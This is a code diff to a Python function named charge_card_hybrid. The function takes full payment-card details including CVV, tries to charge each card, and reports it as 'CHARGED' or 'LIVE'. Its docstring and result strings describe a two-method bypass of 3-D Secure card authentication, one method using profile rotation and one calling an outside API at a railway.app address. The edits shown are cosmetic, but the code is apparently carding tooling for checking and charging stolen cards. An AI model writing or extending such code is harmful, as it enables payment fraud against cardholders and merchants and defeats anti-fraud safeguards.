@@ -17,7 +17,7 @@ HEADERS = {
 API_URL = "https://web-production-2f61.up.railway.app"
 
 async def charge_card_hybrid(card: dict, pk: str, cs: str, init_data: dict, session: aiohttp.ClientSession) -> dict:
-    """Hybrid 3DS bypass: Try method 1 (profile rotation) first, then method 2 (API) if needed"""
+    """Dual 3DS bypass: Try method 1 (profile rotation) first, then method 2 (API) if needed"""
     start = time.perf_counter()
     result = {
         "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
@@ -129,7 +129,7 @@ async def charge_card_hybrid(card: dict, pk: str, cs: str, init_data: dict, sess
                 
                 if final_status == "succeeded":
                     result["status"] = "CHARGED"
-                    result["response"] = f"3DS Bypassed ✅ [Method 1: {bypass_result.get('method')}]"
+                    result["response"] = f"3DS Bypassed ✅"
                     result["bypass_method"] = "method_1"
                     result["time"] = round(time.perf_counter() - start, 2)
                     return result
@@ -165,7 +165,7 @@ async def charge_card_hybrid(card: dict, pk: str, cs: str, init_data: dict, sess
                 
                 if api_status == "charge":
                     result["status"] = "CHARGED"
-                    result["response"] = f"3DS Bypassed ✅ [Method 2: API] - {api_msg}"
+                    result["response"] = f"3DS Bypassed ✅ - {api_msg}"
                     result["bypass_method"] = "method_2"
                 elif api_status == "live":
                     result["status"] = "LIVE"
